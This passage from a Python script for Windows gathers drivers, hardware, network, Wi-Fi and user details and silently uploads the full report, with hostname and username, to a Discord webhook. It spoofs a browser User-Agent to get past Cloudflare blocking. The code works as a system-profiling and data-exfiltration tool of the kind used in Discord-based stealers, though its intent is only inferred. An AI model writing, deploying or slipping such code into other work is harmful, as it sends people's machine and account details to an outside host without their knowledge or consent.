        drivers = ps_list(drv_script, timeout=60)

        if not drivers:
            lines.append("  No driver data returned.")
            log_err("collect_drivers", Exception("Win32_PnPSignedDriver returned empty"))
            R["drivers"] = lines; return

        by_class = {}
        for d in drivers:
            cls = (d.get("DeviceClass") or "Unknown").strip() or "Unknown"
            by_class.setdefault(cls, []).append(d)

        lines.append(f"  Total drivers: {sum(len(v) for v in by_class.values())}\n")
        for cls in sorted(by_class.keys()):
            lines.append(f"  +-- [{cls.upper()}]  ({len(by_class[cls])} devices)")
            for d in by_class[cls]:
                lines.append(f"  |  Device  : {(d.get('DeviceName') or 'N/A').strip()}")
                lines.append(f"  |  Vendor  : {(d.get('Manufacturer') or 'N/A').strip()}")
                lines.append(f"  |  Version : {(d.get('DriverVersion') or 'N/A').strip()}    Date: {(d.get('DriverDate') or 'N/A').strip()}")
                lines.append(f"  |  INF     : {(d.get('InfName') or 'N/A').strip()}    Signed: {(d.get('IsSigned') or 'N/A').strip()}    Status: {(d.get('Status') or 'N/A').strip()}")
                lines.append(f"  |")
            lines.append(f"  +{'─'*55}\n")

    except Exception as e:
        log_err("collect_drivers", e)
        lines.append(f"  ERROR: {e}")
    R["drivers"] = lines


# ════════════════════════════════════════════════════════════════
#  DISCORD WEBHOOK — 403 fix: proper User-Agent
# ════════════════════════════════════════════════════════════════

def send_discord(text: str):
    import urllib.request, urllib.error

    hostname = platform.node()
    username = os.getenv("USERNAME") or "Unknown"
    ts       = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    fname    = f"REPORT_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    msg      = f"**SYSTEM REPORT** | `{hostname}` | `{username}` | {ts}"

    try:
        data  = text.encode("utf-8")
        BOUND = b"----FormBoundaryABCDEF123456"
        CRLF  = b"\r\n"
        DD    = b"--"

        body  = DD + BOUND + CRLF
        body += b'Content-Disposition: form-data; name="content"' + CRLF + CRLF
        body += msg.encode("utf-8") + CRLF
        body += DD + BOUND + CRLF
        body += (f'Content-Disposition: form-data; name="files[0]"; filename="{fname}"').encode() + CRLF
        body += b"Content-Type: text/plain; charset=utf-8" + CRLF + CRLF
        body += data + CRLF
        body += DD + BOUND + DD + CRLF

        req = urllib.request.Request(
            WEBHOOK,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={BOUND.decode()}",
                # Fix Discord/Cloudflare 403 — must NOT be Python-urllib
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            method="POST"
        )
        resp = urllib.request.urlopen(req, timeout=30)
        log_err("send_discord_success", Exception(f"HTTP {resp.status} — {len(data)} bytes sent"))

    except urllib.error.HTTPError as e:
        body_resp = e.read().decode("utf-8", errors="ignore")
        log_err("send_discord_HTTPError", Exception(f"HTTP {e.code}: {body_resp}"))
    except Exception as e:
        log_err("send_discord_EXCEPTION", e)


# ════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════

def main():
    R = {}
    collectors = [
        collect_os, collect_bios, collect_cpu, collect_ram,
        collect_gpu, collect_disk, collect_network, collect_wifi,
        collect_battery, collect_misc, collect_drivers,
    ]

    threads = [Thread(target=fn, args=(R,), daemon=True) for fn in collectors]
    for t in threads: t.start()
    for t in threads: t.join(timeout=60)

    order = ["os","bios","cpu","ram","gpu","disk","network","wifi","battery","misc","drivers"]
    buf   = StringIO()
    buf.write(SEP + "\n")
    buf.write(f"  FULL SYSTEM REPORT  —  {NOW}\n")
    buf.write(f"  Computer : {platform.node()}\n")
    buf.write(f"  User     : {os.getenv('USERNAME','N/A')}\n")
    buf.write(SEP + "\n")
    for key in order:
        for line in R.get(key, [f"  [{key}] — no data"]):
            buf.write(line + "\n")
    buf.write(f"\n{SEP}\n  END OF REPORT\n{SEP}\n")

    send_discord(buf.getvalue())
    save_error_log()


if __name__ == "__main__":
    main()